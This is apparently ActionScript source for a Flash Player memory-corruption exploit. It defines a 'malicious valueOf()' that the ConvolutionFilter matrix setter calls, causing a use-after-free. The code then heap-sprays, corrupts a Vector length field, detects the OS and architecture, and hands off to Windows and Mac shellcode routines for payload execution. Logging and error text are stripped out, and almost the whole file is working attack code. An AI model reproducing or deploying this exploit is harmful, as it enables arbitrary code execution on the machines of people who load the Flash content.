﻿package
{
	import flash.display.DisplayObjectContainer;
	//import fl.controls.Button;
	//import fl.controls.TextArea;
	import flash.filters.ConvolutionFilter;
	import flash.system.Capabilities;
	import flash.events.MouseEvent;
	import flash.external.ExternalInterface;
	
	
	public class MyClass
	{
		static var 
			//_log:TextArea,
			_gc:Array, 
			_va:Array,
			_vLen:uint = 14*15,
			_cf:ConvolutionFilter,
			_isDbg:Boolean = Capabilities.isDebugger;
	
		public function MyClass()
		{
				//TryExpl();
		}
		
		// prints text message into the text area
		static function logAdd(str:String):void
		{
			//_log.htmlText += "<pre>" + str;
		}
		
		// define malicious valueOf()
		prototype.valueOf = function()
		{
			//logAdd("MyClass.valueOf()");
			
			// check for the second valueOf() call
			//if (_cf.matrixX > 14) throw new Error("break overwriting");
			if (_cf.matrixX > 14) throw new Error("");
			
			_va = new Array(5);
			_gc.push(_va); // protect from GC // for RnD
			
			// reallocate _cf matrix
			_cf.matrixX = 15;
			
			// reuse freed memory
			for(var i:int; i < _va.length; i++) {
				_va[i] = new Vector.<uint>;
				_va[i].length = _vLen;
			}
			
			// return value for vector length overwriting
			return 2; // = 0x40000000 as single precision
		}
		
		// try to corrupt the length field of Vector.<uint>
		public static function TryExpl() : Boolean
		{
			try
			{			
				var j:int, alen:int = 20+78;
				var a = new Array(alen);
				if (_gc == null) _gc = new Array();
				_gc.push(a); // protect from GC // for RnD
				
				// prepare matrix array
				var m:Array = new Array(_vLen);
				m[0] = new MyClass;	
				m[1] = m[0];
				
				// fill memory "holes" if any
				for(var i:int; i < 20; i++)
					a[i] = new ConvolutionFilter(14,15);
				
				// try to allocate two sequential pages of memory: [ matrix ][ MyClass2 ]
				for(i=20; i < alen; i+=6){
					a[i] = new MyClass2(i);
					
					for(j=i+1; j < i+5; j++)
						a[j] = new ConvolutionFilter(14,15);
					
					a[i+5] = new MyClass2(i+5);
				}
								
				// find these pages
				var v:Vector.<uint>, m0;
				for(i=alen-26; i > 20; i-=6)
				{
					_cf = a[i];
					//logAdd("matrix[0] = " + _cf.matrix[0]);
					
					// call MyClass.valueOf() from matrix setter and cause UaF memory corruption 
					try { _cf.matrix = m; } catch (e:Error){}
					
					// check results // matrix[0] should be unchanged 0
					m0 = _cf.matrix[0];
					//logAdd("matrix[0] = " + m0);
					//if (m0 != 0) throw new Error("can't cause UaF");
					if (m0 != 0) throw new Error("");
					
					// find corrupted vector
					for(j=0; j < _va.length; j++){
						v = _va[j];
						if (v.length != _vLen) {
							//logAdd("v.length = 0x" + v.length.toString(16));
							
							// check the [ MyClass2 ] presence after [ matrix ]
							for(var n:int=1, k:int=0x40+0xfe; n <= 4; n++, k+=0xfe)
								if (v[k] == 0x11223344) {
									// ok, scroll k to mc.a0
									do k-- while (v[k] == 0x11223344);
									var mc:MyClass2 = a[v[k]];
									mc.length = 0x123;
									
									//logAdd("k = " + (k - n*0xfe) + ", mc = " + MyUtils.ToStringV(v, k-64, 68)); // 4RnD
									
									// check for x64 and proceed to payload execution
									if ((k - n*0xfe) > 40) {
										if (MyUtils.isWin()) {
											if (ShellWin64.Init(v, k*4 - 0xF8, mc, k-8)) ShellWin64.Exec() else logAdd(""); 
											//else for(var g:int; g < 0x100; g+=4) if (ShellWin64.Init(v, k*4 - g, mc, k-8)){ logAdd("g = " + g); break; } // 4RnD
										}else
										if (MyUtils.isMac()) {
											if (ShellMac64.Init(v, k*4 - 0xE8, mc, k-8)) ShellMac64.Exec() else logAdd(""); 
											//else for(var g:int=0x100; g > 0; g-=4) if (ShellMac64.Init(v, k*4 - g, mc, k-8)){ logAdd("g = " + g); break; }
										}
										//else
										//	logAdd("unknown x64 os");
									} else {
										if (MyUtils.isWin()) {
											if (ShellWin32.Init(v, (v[k-4] & 0xfffff000) - 0x1000 + 0x20 + (4-n)*0xfe*4 + 8, mc, k-4))
												 ShellWin32.Exec()
											//else logAdd(""); 
										}
										//else
										//	logAdd("");
									}
									
									//logAdd("v.length = 0x" + v.length.toString(16));
									return true;
								}
							
							//logAdd("bad MyClass2 allocation.");
							break;
						}
					}
				}
				
				//logAdd("bad allocation. try again.");
			}
			catch (e:Error) 
			{
				//logAdd("TryExpl() " + e.toString());
			}
			
			return false;
		}
		
		// 
		static function btnClickHandler(e:MouseEvent):void 
		{
			try
			{	
				
				//logAdd("===== start =====");
				
				// try to exploit
				TryExpl();
				
				//logAdd("=====  end  =====");
			}
			catch (e:Error) 
			{
				//logAdd(e.toString());
			}
		}
		
		// init GUI elements
		static public function InitGui(doc: DisplayObjectContainer)
		{
			try
			{
				// add text area
				//_log = new TextArea(); 
				//_log.move(20,2);
				//_log.setSize(560, 360); 
				//_log.condenseWhite = true; 
				//_log.editable = false;
				//doc.addChild(_log);
				
				// add the button
				//var btn:Button = new Button();
				//btn.label = "Run" + (MyUtils.isWin() ? " calc.exe":"");
				//btn.move(220, 370);
				//btn.setSize(160,26);
				//btn.addEventListener(MouseEvent.CLICK, btnClickHandler);
				//doc.addChild(btn);
			
				// print environment info
				//logAdd("Flash: " + Capabilities.version + (Capabilities.isDebugger ? " Debug":"")
				//		+ " " + Capabilities.cpuArchitecture + (is32() ? "-32" : is64() ? "-64":"") + " " + Capabilities.playerType);
				//logAdd("OS: " + Capabilities.os  + (Capabilities.supports64BitProcesses ? " 64-bit":" 32-bit"));
			
				//if (ExternalInterface.available)
				//	logAdd("Browser: " + callJS("getEnvInfo"));
			}
			catch (e:Error) 
			{
				//logAdd("InitGui() " + e.toString());
			}
		}
		
		// calls JavaScript function
		static function callJS(func:String):String 
		{
			try
			{
				if (ExternalInterface.available)
					return "" + ExternalInterface.call(func);
			}
			catch (e:Error) 
			{
			}
			return "";
		}
		
		// checks for x32/x64 platform
		static var _platform:String;
		
		static function is32():Boolean
		{
			var x64:Boolean = Capabilities.supports64BitProcesses;
			if (x64 && MyUtils.isWin()) {
				// FP can be 32-bit on Windows x64
				if (_platform == null) _platform = callJS("getPlatform");
				return _platform.search("32") >= 0;
			}
			return !x64;
		}
		
		static function is64():Boolean
		{
			var x64:Boolean = Capabilities.supports64BitProcesses;
			if (x64 && MyUtils.isWin()) {
				// FP can be 32-bit on Windows x64
				if (_platform == null) _platform = callJS("getPlatform");
				return _platform.search("64") >= 0;
			}
			return x64;
		}
	}

}